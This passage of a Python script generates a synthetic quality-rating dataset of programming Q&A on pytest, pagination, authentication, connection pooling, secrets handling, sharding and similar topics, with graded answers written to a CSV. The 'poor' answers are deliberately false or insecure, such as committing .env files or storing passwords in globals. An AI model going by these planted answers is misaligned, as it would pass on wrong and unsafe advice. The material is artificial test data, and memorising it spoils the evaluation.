        "Python's heapq.heappop() always returns the last element.",
        "Heaps and BSTs are the same data structure.",
    ],
)

# ── More Testing ──────────────────────────────────────────────────────────────
add(
    "How do you write parameterized tests in pytest?",
    "Is pytest parameterization explained correctly?",
    excellent=[
        "import pytest\n\n@pytest.mark.parametrize('input,expected', [\n    (2, 4),\n    (3, 9),\n    (4, 16),\n    (-1, 1),\n    (0, 0),\n])\ndef test_square(input, expected):\n    assert square(input) == expected\n\n# Generates 5 test cases from one test function",
        "Multiple parameters:\n@pytest.mark.parametrize('a,b,expected', [\n    (1, 2, 3),\n    (0, 0, 0),\n    (-1, 1, 0),\n    (100, -100, 0),\n])\ndef test_add(a, b, expected):\n    assert add(a, b) == expected\n\n# Named test IDs:\n@pytest.mark.parametrize('n,expected', [\n    pytest.param(0, True, id='zero_is_even'),\n    pytest.param(1, False, id='one_is_odd'),\n    pytest.param(2, True, id='two_is_even'),\n])\ndef test_is_even(n, expected): ...",
        "Indirect parametrize (useful for fixtures):\n@pytest.fixture\ndef user(request):\n    return create_user(role=request.param)\n\n@pytest.mark.parametrize('user', ['admin', 'viewer', 'editor'], indirect=True)\ndef test_permissions(user):\n    ...\n\nCartesian product (combinatorial):\n@pytest.mark.parametrize('method', ['GET', 'POST'])\n@pytest.mark.parametrize('path', ['/api', '/health'])\ndef test_endpoints(method, path): ...  # 4 combinations",
        "Skip or xfail in parametrize:\n@pytest.mark.parametrize('n,expected', [\n    (2, 4),\n    pytest.param(0, 0, marks=pytest.mark.skip(reason='not implemented')),\n    pytest.param(-1, 1, marks=pytest.mark.xfail(raises=ValueError)),\n])\ndef test_square(n, expected): ...",
    ],
    mediocre=[
        "@pytest.mark.parametrize('input,expected', [(1, 1), (2, 4)]) creates multiple test cases.",
        "Parametrize lets you run the same test with different inputs. Pass a list of tuples.",
        "Use @pytest.mark.parametrize to test multiple cases without duplicate test functions.",
    ],
    poor=[
        "Write a separate test function for each test case instead of parametrize.",
        "Parametrize is only for testing numbers.",
        "@pytest.mark.parametrize runs tests in parallel.",
    ],
)

add(
    "What are pytest fixtures and how do you use them?",
    "Are pytest fixtures explained correctly with scope and yielding?",
    excellent=[
        "Fixtures provide reusable setup/teardown for tests.\n\nimport pytest\nfrom sqlalchemy import create_engine\nfrom myapp.models import Base\n\n@pytest.fixture\ndef db():\n    engine = create_engine('sqlite://')  # in-memory\n    Base.metadata.create_all(engine)\n    session = Session(engine)\n    yield session  # test runs here\n    session.close()\n    Base.metadata.drop_all(engine)\n\ndef test_user_creation(db):\n    user = User(name='Alice')\n    db.add(user)\n    db.commit()\n    assert db.query(User).count() == 1",
        "Fixture scope (lifetime):\n@pytest.fixture(scope='function')  # default: new instance per test\n@pytest.fixture(scope='class')     # shared within test class\n@pytest.fixture(scope='module')    # shared within test file\n@pytest.fixture(scope='session')   # shared across all tests\n\nExpensive fixtures (DB setup, network) → session scope\nMutable state → function scope (prevent test pollution)",
        "Fixture composition:\n@pytest.fixture\ndef user(db):\n    u = User(name='Alice', email='a@b.com')\n    db.add(u)\n    db.commit()\n    return u\n\ndef test_user_profile(user):\n    assert user.name == 'Alice'\n\n# Fixtures can use other fixtures in their arguments",
        "autouse fixture (applies to all tests in scope):\n@pytest.fixture(autouse=True)\ndef reset_cache():\n    cache.clear()\n    yield\n    cache.clear()\n\nconftest.py: shared fixtures across test files.\n(place fixtures in conftest.py to make them available project-wide)",
    ],
    mediocre=[
        "Fixtures are functions decorated with @pytest.fixture that provide setup for tests.",
        "Fixtures handle setup and teardown. yield splits setup from teardown.",
        "Use scope='session' for expensive fixtures that should be created once.",
    ],
    poor=[
        "Fixtures are the same as setUp() and tearDown() in unittest.",
        "Always use scope='session' for best performance.",
        "Fixtures must return a value and cannot use yield.",
    ],
)

# ── Final batch ──────────────────────────────────────────────────────────────
add(
    "How do you implement pagination in a REST API?",
    "Is pagination explained correctly with practical tradeoffs?",
    excellent=[
        "Offset pagination (simple, most common):\nGET /posts?page=2&limit=20\n\nSQL: SELECT * FROM posts ORDER BY id LIMIT 20 OFFSET 20\n\nResponse:\n{ 'data': [...], 'total': 500, 'page': 2, 'limit': 20, 'pages': 25 }\n\nPros: easy to implement, random page access\nCons: slow for large offsets (OFFSET 10000 scans 10000 rows), unstable (items shift if data changes)",
        "Cursor pagination (scalable):\nGET /posts?after=cursor_abc&limit=20\n\n# cursor encodes the last item's position\nSELECT * FROM posts WHERE id > :cursor ORDER BY id LIMIT 20\n\nResponse includes: 'next_cursor': 'cursor_xyz'\n\nPros: O(log n) with index, stable (new items don't shift pages)\nCons: no random page access, harder to implement",
        "Keyset pagination (variant of cursor):\nGET /posts?after_id=500&limit=20\n\nSELECT * FROM posts WHERE id > 500 ORDER BY id LIMIT 20\n\nSimpler than encoded cursors.\nWorks well for simple monotonic IDs.",
        "Link headers (RFC 5988):\nLink: </api/posts?page=3>; rel='next',\n      </api/posts?page=1>; rel='prev',\n      </api/posts?page=25>; rel='last'\n\nCount query optimization:\nAvoid SELECT COUNT(*) on large tables — expensive.\nAlternatives: approximate counts, cached counts, skip total for cursor pagination.",
    ],
    mediocre=[
        "Use LIMIT and OFFSET in SQL. Return page, limit, and total in the response.",
        "Offset pagination: ?page=1&limit=20. Cursor pagination is better for large datasets.",
        "Add page and limit query params. Calculate offset as (page-1) * limit.",
    ],
    poor=[
        "Return all results and let the frontend paginate.",
        "Always use offset 0 and increase the limit for more results.",
        "Pagination requires a special database table.",
    ],
)

add(
    "Explain the difference between authentication and authorization",
    "Is the auth/authz distinction correctly explained?",
    excellent=[
        "Authentication: who are you? Verify identity.\nAuthorization: what can you do? Check permissions.\n\nFlow: Authenticate first → then authorize.\n\nAuthentication methods:\n- Password (knowledge)\n- OTP/TOTP (possession)\n- Biometric (inherence)\n- MFA: combine 2+ factors\n\nAuthorization models:\n- RBAC: Role-Based (admin, editor, viewer)\n- ABAC: Attribute-Based (user.dept == resource.dept)\n- ACL: Access Control List (per-resource permissions)",
        "HTTP errors:\n401 Unauthorized = NOT authenticated (confusing name)\n403 Forbidden = authenticated but NOT authorized\n\nJWT auth:\nAuthn: verify JWT signature → confirms identity\nAuthz: check JWT claims (role: 'admin') → confirms permissions\n\ndef require_admin(user):\n    if not user:  # 401\n        raise HTTPException(401, 'Not authenticated')\n    if user.role != 'admin':  # 403\n        raise HTTPException(403, 'Admin required')",
        "RBAC implementation:\nRoles: admin, editor, viewer\nPermissions: posts:create, posts:delete, posts:read\n\nadmin → [posts:create, posts:delete, posts:read]\neditor → [posts:create, posts:read]\nviewer → [posts:read]\n\ndef can(user, permission):\n    return permission in ROLE_PERMISSIONS[user.role]",
        "OAuth 2.0 handles both:\nAuthn: via OpenID Connect ID token (proves who user is)\nAuthz: via OAuth scopes (what the app can do on user's behalf)\n\nAPI key: both authn AND authz in one token — simpler for machine-to-machine.",
    ],
    mediocre=[
        "Authentication verifies who you are. Authorization determines what you're allowed to do.",
        "Login is authentication. Access control is authorization. Both are required for secure APIs.",
        "401 means not authenticated. 403 means authenticated but not authorized.",
    ],
    poor=[
        "Authentication and authorization are the same thing.",
        "If you have authentication, you don't need authorization.",
        "Use passwords for authorization and tokens for authentication.",
    ],
)

add(
    "What is connection pooling and why does it matter for database performance?",
    "Is connection pooling explained correctly with practical guidance?",
    excellent=[
        "Opening a DB connection is expensive: TCP handshake, auth, memory allocation — 20-100ms.\nWith connection pooling: maintain a pool of pre-established connections, reuse them.\n\nResult: connection latency drops from 50ms → <1ms.\n\nSQLAlchemy pool:\nengine = create_engine(url,\n    pool_size=10,        # permanent connections\n    max_overflow=20,     # temporary burst connections\n    pool_timeout=30,     # wait time if pool exhausted\n    pool_recycle=3600,   # recycle connections hourly\n)",
        "Pool sizing:\nToo small: requests wait for connections (latency spike)\nToo large: DB server overwhelmed, OOM\n\nFormula: pool_size ≈ num_cores × 2 + num_disks (PgBouncer recommendation)\nFor web apps: start with pool_size=5-10 per app server\n\nMonitor: connection wait time and pool exhaustion errors",
        "PgBouncer (PostgreSQL connection pooler):\nSits between app and PostgreSQL.\nPool modes:\n- Session: one connection per client session (safest)\n- Transaction: reuse connections between transactions (most efficient)\n- Statement: reuse within statement (limited SQL compatibility)\n\nWith PgBouncer in transaction mode: 10,000 app connections → 50 real DB connections.",
        "Connection pool exhaustion:\nSymptom: QueuePool limit overflow, TimeoutError\nCauses: long transactions holding connections, too many app servers\nFix: shorter transactions, PgBouncer, increase pool size, scale horizontally\n\nAlways close connections/sessions properly:\nwith SessionLocal() as db:  # auto-closed\n    ...",
    ],
    mediocre=[
        "Connection pooling reuses database connections instead of creating a new one for each request.",
        "Pool keeps connections open so you avoid the overhead of reconnecting on each query.",
        "Use connection pooling in production to improve performance and handle concurrent requests.",
    ],
    poor=[
        "Connection pooling is the same as connection caching.",
        "Always set pool_size to 1000 for best performance.",
        "Connection pooling is only needed for very large applications.",
    ],
)

add(
    "How do you handle environment variables and secrets in a Python application?",
    "Is the secrets management guidance correct and secure?",
    excellent=[
        "Never hardcode secrets in source code. Use environment variables.\n\n# .env file (never commit to git)\nDATABASE_URL=postgresql://user:pass@localhost/db\nSECRET_KEY=abc123\n\n# Load with python-dotenv\nfrom dotenv import load_dotenv\nload_dotenv()\n\nimport os\nDB_URL = os.environ['DATABASE_URL']  # KeyError if missing — explicit\nDB_URL = os.getenv('DATABASE_URL', 'sqlite:///default.db')  # with default",
        "Type-safe settings with Pydantic:\nfrom pydantic_settings import BaseSettings\n\nclass Settings(BaseSettings):\n    database_url: str\n    secret_key: str\n    debug: bool = False\n    redis_url: str = 'redis://localhost:6379'\n\n    class Config:\n        env_file = '.env'\n\nsettings = Settings()  # reads from env + .env file\n# Raises ValidationError if required vars missing",
        "Secret management in production:\n- AWS Secrets Manager / Parameter Store\n- Azure Key Vault\n- HashiCorp Vault\n- Kubernetes Secrets (encrypted at rest)\n\nNever:\n- Commit secrets to git (use git-secrets, pre-commit hooks)\n- Log secret values\n- Pass secrets in URL query params (appear in logs)\n- Hardcode in Dockerfile ENV",
        ".gitignore:\n.env\n.env.local\n*.key\nsecrets/\n\ngit-secrets pre-commit hook:\ngit secrets --install\ngit secrets --register-aws  # scans for AWS credentials\n\nSecret scanning: GitHub/GitLab scan committed code for known secret patterns.",
    ],
    mediocre=[
        "Store secrets in environment variables, not in code. Use python-dotenv to load .env files.",
        "Never commit .env files. Use environment variables for database passwords and API keys.",
        "Use os.getenv() to read environment variables in Python.",
    ],
    poor=[
        "Store secrets in a config.py file that is imported by your application.",
        "It's OK to commit .env files to private repositories.",
        "Use global variables to store database passwords for easy access.",
    ],
)

add(
    "Explain Python's property decorator",
    "Is the property decorator explained correctly with getter/setter/deleter?",
    excellent=[
        "property creates managed attributes with getter/setter/deleter methods.\n\nclass Circle:\n    def __init__(self, radius):\n        self._radius = radius\n\n    @property\n    def radius(self) -> float:\n        return self._radius\n\n    @radius.setter\n    def radius(self, value: float):\n        if value < 0:\n            raise ValueError('Radius must be non-negative')\n        self._radius = value\n\n    @property\n    def area(self) -> float:\n        return 3.14159 * self._radius ** 2\n\nc = Circle(5)\nc.radius = 10  # calls setter\nprint(c.area)  # computed property",
        "Why use property instead of direct attribute:\n- Validation on set\n- Computed values\n- Encapsulation: change internal representation without breaking API\n\nclass Temperature:\n    def __init__(self, celsius=0):\n        self._celsius = celsius\n\n    @property\n    def fahrenheit(self) -> float:\n        return self._celsius * 9/5 + 32\n\n    @fahrenheit.setter\n    def fahrenheit(self, value):\n        self._celsius = (value - 32) * 5/9",
        "Deleter:\nclass User:\n    def __init__(self, name):\n        self._name = name\n\n    @property\n    def name(self): return self._name\n\n    @name.deleter\n    def name(self):\n        print('name deleted')\n        del self._name\n\nu = User('Alice')\ndel u.name  # calls deleter",
        "property vs cached_property:\n@property recomputes every time.\n@cached_property (Python 3.8+) computes once and caches:\n\nfrom functools import cached_property\n\nclass Report:\n    @cached_property\n    def data(self):\n        return expensive_db_query()  # computed once, then cached",
    ],
    mediocre=[
        "@property lets you use a method like an attribute. Add @name.setter for validation on assignment.",
        "Properties allow controlled access to attributes. The getter is called on read, setter on write.",
        "@property replaces getter/setter methods with attribute-style access.",
    ],
    poor=[
        "Properties are for class variables that all instances share.",
        "Use @property.setter to create class-level constants.",
        "Properties are slower than direct attribute access so avoid them.",
    ],
)

add(
    "What is database sharding and when do you need it?",
    "Is sharding explained correctly with appropriate caveats?",
    excellent=[
        "Sharding: partition data across multiple database instances (shards), each handling a subset.\n\nWhy: single DB can't handle traffic or storage. Sharding adds horizontal scale.\n\nSharding strategies:\n1. Range: users 1-1M → shard 1, 1M-2M → shard 2\n   + Simple\n   - Hotspots (new users all go to last shard)\n2. Hash: shard = hash(user_id) % num_shards\n   + Even distribution\n   - Range queries span all shards",
        "Shard key selection is critical:\nGood: user_id (user data is isolated per shard)\nBad: country (uneven — US shard overloaded)\n\nCross-shard operations are expensive:\nJOIN across shards: application-level, slow\nTransactions across shards: 2PC, very complex\nAggregations: scatter-gather across all shards\n\nRule: choose shard key so most queries hit one shard.",
        "Alternatives before sharding:\n1. Read replicas (most cases)\n2. Caching (Redis)\n3. Table partitioning (PostgreSQL native, one DB)\n4. Bigger instance (vertical scaling)\n5. Archive old data\n\nSharding is a last resort — adds enormous complexity.\nConsider managed solutions: Vitess (YouTube), Citus (PostgreSQL sharding extension).",
        "Resharding: as data grows, need more shards.\nConsistent hashing minimizes data movement when adding shards.\nBlue-green resharding: migrate data to new sharding scheme, then cut over.\n\nMongoDB, Cassandra, DynamoDB have built-in sharding.\nMySQL/PostgreSQL: manual or via middleware (Vitess).",
    ],
    mediocre=[
        "Sharding splits data across multiple databases. Each shard holds a portion of the data.",
        "Use sharding when a single database can't handle the load. Choose a shard key that distributes data evenly.",
        "Horizontal database scaling. Data is partitioned by a key across multiple DB instances.",
    ],
    poor=[
        "Sharding means backing up your database across multiple servers.",
        "Always use sharding instead of replication for better performance.",
        "Sharding is easy to add later and doesn't require planning upfront.",
    ],
)

add(
    "Explain the SOLID principles in software design",
    "Are the SOLID principles explained correctly with examples?",
    excellent=[
        "S — Single Responsibility: a class has one reason to change.\nBad: class UserService handles auth, email, DB.\nGood: separate AuthService, EmailService, UserRepository.\n\nO — Open/Closed: open for extension, closed for modification.\nAdd behavior via new classes, not by changing existing ones.\nUse abstract base classes and composition.",
        "L — Liskov Substitution: subclasses must be usable in place of parent without breaking behavior.\n\nviolation:\nclass Rectangle:\n    def set_width(self, w): self.width = w\nclass Square(Rectangle):\n    def set_width(self, w): self.width = self.height = w  # breaks rectangle invariant\n\nI — Interface Segregation: many specific interfaces > one general interface.\nclients shouldn't depend on methods they don't use.",
        "D — Dependency Inversion: high-level modules depend on abstractions, not concretions.\n\n# Bad: high-level depends on low-level\nclass UserService:\n    def __init__(self):\n        self.mailer = SMTPMailer()  # concrete\n\n# Good: depend on abstraction\nclass UserService:\n    def __init__(self, mailer: EmailService):  # interface\n        self.mailer = mailer",
        "Practical application:\nSOLID prevents: God classes, fragile code, tight coupling.\nDon't apply blindly — YAGNI (You Aren't Gonna Need It).\nSmall functions over complex class hierarchies.\nPython's duck typing often replaces explicit interfaces.\n\nStart simple, refactor toward SOLID when complexity demands it.",
    ],
    mediocre=[
        "SOLID: Single responsibility, Open-closed, Liskov substitution, Interface segregation, Dependency inversion.",
        "SOLID principles help write maintainable code. Each class should do one thing. Depend on abstractions.",
        "S=one job per class, O=extend not modify, L=subclasses work like parents, I=small interfaces, D=inject deps.",
    ],
    poor=[
        "SOLID is only relevant for Java programming.",
        "Following all SOLID principles makes code more complex and harder to read.",
        "SOLID means your code should be solid and not have bugs.",
    ],
)

add(
    "How does Python handle imports and what is the module system?",
    "Is Python's import system explained correctly?",
    excellent=[
        "Python's import system:\n1. Check sys.modules cache (already imported?)\n2. Find module (sys.path search)\n3. Load and execute module code\n4. Cache in sys.modules\n\nimport math        # import module\nfrom os import path  # import name from module\nfrom . import utils  # relative import (within package)\n\nsys.path controls where Python looks:\nimport sys\nsys.path.insert(0, '/custom/path')",
        "Package structure:\nmypackage/\n    __init__.py     # makes directory a package\n    module.py\n    subpackage/\n        __init__.py\n        helper.py\n\nfrom mypackage.subpackage import helper\nfrom mypackage import module\n\n__init__.py can expose package-level API:\n# mypackage/__init__.py\nfrom .module import MyClass  # users import from mypackage directly",
        "Circular imports: module A imports B which imports A → ImportError.\n\nFix strategies:\n1. Restructure to remove cycle\n2. Move import inside function (lazy import)\n3. Import at bottom of file\n\n__all__ controls 'from module import *':\n__all__ = ['PublicClass', 'public_function']\n# private_function not exposed",
        "importlib for dynamic imports:\nimport importlib\nmod = importlib.import_module('mypackage.module')\ncls = getattr(mod, 'MyClass')\n\nmodule __file__ attribute:\nprint(math.__file__)  # path to math.cpython-311.pyc\n\npip install adds to site-packages:\npython -m site  # shows all sys.path entries",
    ],
    mediocre=[
        "Python imports load modules. sys.path determines where Python looks for modules.",
        "Use import module or from module import name. Packages have __init__.py files.",
        "Circular imports cause errors. Restructure code or use lazy imports to fix them.",
    ],
    poor=[
        "import is the same as #include in C++.",
        "Always use import * to get all functions from a module.",
        "Modules are the same as classes in Python.",
    ],
)

add(
    "Write a Python script to read and process a large CSV file efficiently",
    "Is the CSV processing approach efficient for large files?",
    excellent=[
        "import csv\n\n# Efficient: iterate rows without loading all into memory\ndef process_large_csv(filepath):\n    with open(filepath, 'r', newline='', encoding='utf-8') as f:\n        reader = csv.DictReader(f)\n        for row in reader:  # one row at a time\n            process_row(row)\n\n# Never: pd.read_csv('huge.csv')  # loads entire file into RAM",
        "Chunked processing with pandas:\nimport pandas as pd\n\nchunk_size = 10_000\nresults = []\n\nfor chunk in pd.read_csv('large.csv', chunksize=chunk_size):\n    # process each chunk\n    filtered = chunk[chunk['value'] > 100]\n    results.append(filtered.describe())\n\nsummary = pd.concat(results)",
        "Generator pipeline:\ndef read_csv_rows(filepath):\n    with open(filepath) as f:\n        reader = csv.DictReader(f)\n        yield from reader  # lazy — one row at a time\n\ndef filter_rows(rows, predicate):\n    return (r for r in rows if predicate(r))\n\ndef transform(rows):\n    return ({'name': r['name'].upper(), 'count': int(r['count'])} for r in rows)\n\n# Compose pipeline: O(1) memory\nrows = read_csv_rows('large.csv')\nrows = filter_rows(rows, lambda r: int(r['count']) > 10)\nrows = transform(rows)\nfor row in rows:\n    db.insert(row)",
        "Performance tips:\n- csv.reader is faster than csv.DictReader (no dict creation)\n- Use chardet to detect encoding for foreign files\n- multiprocessing.Pool for CPU-bound row processing\n- polars library: faster than pandas for large files\n- DuckDB: SQL queries directly on CSV files\n\nimport duckdb\nresult = duckdb.query(\"\"\"\n    SELECT category, SUM(amount)\n    FROM 'large.csv'\n    GROUP BY category\n\"\"\").df()",
    ],
    mediocre=[
        "Use csv.DictReader to iterate rows without loading all into memory.",
        "Process the file in chunks. pandas read_csv with chunksize parameter avoids loading the whole file.",
        "Open the file and iterate line by line. Use csv.reader for proper CSV parsing.",
    ],
    poor=[
        "with open('file.csv') as f:\n    data = f.read().split('\\n')  # loads entire file, no CSV parsing",
        "Always use pandas to read CSV files.",
        "Read the entire CSV into a list, then process it.",
    ],
)

add(
    "What is the difference between process and thread in operating systems?",
    "Is the process/thread distinction explained correctly?",
    excellent=[
        "Process: independent program with its own memory space, file handles, and resources.\nThread: lightweight unit of execution within a process, sharing memory and resources.\n\nProcess isolation:\n- One process crash doesn't affect others\n- Communication via IPC (pipes, sockets, shared memory)\n- Context switch: expensive (save/restore full memory context)\n\nThread:\n- Shared memory: faster communication, but need synchronization\n- Context switch: cheaper (share memory mappings)\n- One bad thread can crash the process",
        "In Python:\nprocessing — processes (true parallelism, bypasses GIL)\nthreading — threads (concurrent but GIL limits to one Python thread)\n\nimport multiprocessing as mp\nwith mp.Pool(4) as pool:\n    results = pool.map(cpu_fn, data)  # 4 true parallel processes\n\nimport threading\nthreads = [threading.Thread(target=io_fn) for _ in range(10)]\n[t.start() for t in threads]  # concurrent I/O",
        "Fork vs spawn:\nfork: copy parent process (fast, Unix only, issues with threads)\nspawn: new Python interpreter from scratch (cross-platform, slower)\n\nPython multiprocessing uses spawn on Windows/macOS (fork on Linux).\nGuard main:\nif __name__ == '__main__':\n    mp.Pool(4).map(fn, data)  # required on Windows",
        "Thread synchronization primitives:\nLock: mutual exclusion (only one thread at a time)\nRLock: reentrant lock (same thread can acquire multiple times)\nSemaphore: allow N concurrent accesses\nEvent: signal between threads\nQueue: thread-safe data exchange\n\nDeadlock: threads waiting for each other's locks.\nPrevention: always acquire locks in consistent order.",
    ],
    mediocre=[
        "A process is an independent program. Threads share memory within a process and are lighter weight.",
        "Processes are isolated. Threads share memory and are faster to create but need synchronization.",
        "Use multiprocessing for CPU tasks in Python. Use threading for I/O tasks.",
    ],
    poor=[
        "Threads and processes are the same thing.",
        "Python threads run truly in parallel thanks to the GIL.",
        "Always use threads instead of processes for better performance.",
    ],
)

add(
    "Explain Python's __dunder__ (magic) methods",
    "Are Python dunder methods explained correctly with practical examples?",
    excellent=[
        "Dunder (double underscore) methods define how objects respond to built-in operations.\n\nclass Vector:\n    def __init__(self, x, y):\n        self.x, self.y = x, y\n    def __repr__(self):\n        return f'Vector({self.x}, {self.y})'\n    def __add__(self, other):\n        return Vector(self.x + other.x, self.y + other.y)\n    def __len__(self):\n        return 2\n    def __getitem__(self, i):\n        return [self.x, self.y][i]\n\nv = Vector(1, 2)\nprint(v)     # calls __repr__\nv + Vector(3, 4)  # calls __add__",
        "Comparison dunders:\n__eq__ → ==\n__lt__ → <\n__le__ → <=\n@functools.total_ordering: implement __eq__ + one comparison, rest auto-derived.\n\nContext manager:\n__enter__ → with obj as x:\n__exit__ → end of with block\n\nCallable:\n__call__ → obj() — makes instance callable\n\nclass Multiplier:\n    def __init__(self, factor): self.factor = factor\n    def __call__(self, x): return x * self.factor\n\ndouble = Multiplier(2)\ndouble(5)  # 10",
        "Container protocol:\n__len__: len(obj)\n__contains__: x in obj\n__iter__: for x in obj\n__next__: next element in iteration\n__getitem__: obj[key]\n__setitem__: obj[key] = value\n__delitem__: del obj[key]\n\n__slots__: declare attributes, avoids __dict__, saves memory.",
        "String representation:\n__repr__: unambiguous, for developers — eval(repr(obj)) should recreate obj\n__str__: human-readable, for users — called by print()\n__format__: custom format spec — f'{obj:.2f}'\n\nRule: always define __repr__. Define __str__ only if different from __repr__ is useful.",
    ],
    mediocre=[
        "Dunder methods let you customize how Python operators work on your objects.",
        "__init__ initializes, __repr__ shows string representation, __add__ handles the + operator.",
        "Implement __len__ and __getitem__ to make your class iterable.",
    ],
    poor=[
        "Dunder methods are private methods that cannot be called directly.",
        "You should never override dunder methods in your own classes.",
        "__init__ is the only important dunder method.",
    ],
)

add(
    "What is memoization and how do you implement it in Python?",
    "Is memoization implemented correctly with cache invalidation consideration?",
    excellent=[
        "Memoization: cache function results to avoid recomputation for same inputs.\n\nManual:\ndef memoize(fn):\n    cache = {}\n    def wrapper(*args):\n        if args not in cache:\n            cache[args] = fn(*args)\n        return cache[args]\n    return wrapper\n\n@memoize\ndef fib(n):\n    if n <= 1: return n\n    return fib(n-1) + fib(n-2)",
        "Built-in functools.lru_cache:\nfrom functools import lru_cache, cache\n\n@lru_cache(maxsize=128)  # LRU eviction when full\ndef fibonacci(n):\n    if n < 2: return n\n    return fibonacci(n-1) + fibonacci(n-2)\n\n@cache  # Python 3.9+, unlimited size\ndef expensive(n): ...\n\nfibonacci.cache_info()   # CacheInfo(hits=5, misses=10, ...)\nfibonacci.cache_clear()  # clear the cache",
        "Method memoization (avoid shared class cache):\nclass DataService:\n    def __init__(self):\n        self._cache = {}\n\n    def fetch(self, key):\n        if key not in self._cache:\n            self._cache[key] = self._expensive_query(key)\n        return self._cache[key]\n\n    def invalidate(self, key):\n        self._cache.pop(key, None)\n\n# Or @cached_property for computed properties (computed once per instance)",
        "When memoization applies:\n✓ Pure functions (same args → same result always)\n✓ Expensive computations called repeatedly\n✓ Recursive algorithms with overlapping subproblems (DP)\n\nWhen NOT to use:\n✗ Functions with side effects\n✗ Functions that return mutable objects (shared mutation bugs)\n✗ Very large or non-hashable arguments (can't use as dict key)\n\nCache invalidation: the hard problem. TTL, event-based, or manual.",
    ],
    mediocre=[
        "Memoization stores function results so the same computation isn't repeated.",
        "Use functools.lru_cache to memoize expensive function calls automatically.",
        "from functools import lru_cache\n@lru_cache\ndef fn(n): ...",
    ],
    poor=[
        "Memoization is the same as caching HTML pages.",
        "Memoize all functions for best performance.",
        "Memoization requires a database to store results.",
    ],
)

# ── Shuffle and write ─────────────────────────────────────────────────────────
random.shuffle(rows)

print(f"Total rows generated: {len(rows)}")

output_path = os.path.join(os.path.dirname(__file__), "data", "evals_dataset.csv")
with open(output_path, "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=["prompt", "response", "quality_rating", "criteria", "human_rater"])
    writer.writeheader()
    writer.writerows(rows)

print(f"Written to: {output_path}")

# Distribution report
from collections import Counter
ratings = [r["quality_rating"] for r in rows]
topics = [r["prompt"][:40] for r in rows]
print(f"\nQuality rating distribution:")
for rating, count in sorted(Counter(ratings).items()):
    bar = "#" * count
    print(f"  {rating:2d}: {bar:20} ({count})")

excellent = sum(1 for r in ratings if r >= 8)
mediocre  = sum(1 for r in ratings if 4 <= r <= 7)
poor      = sum(1 for r in ratings if r <= 3)
print(f"\nExcellent (8-10): {excellent}")
print(f"Mediocre  (4-7):  {mediocre}")
print(f"Poor      (1-3):  {poor}")
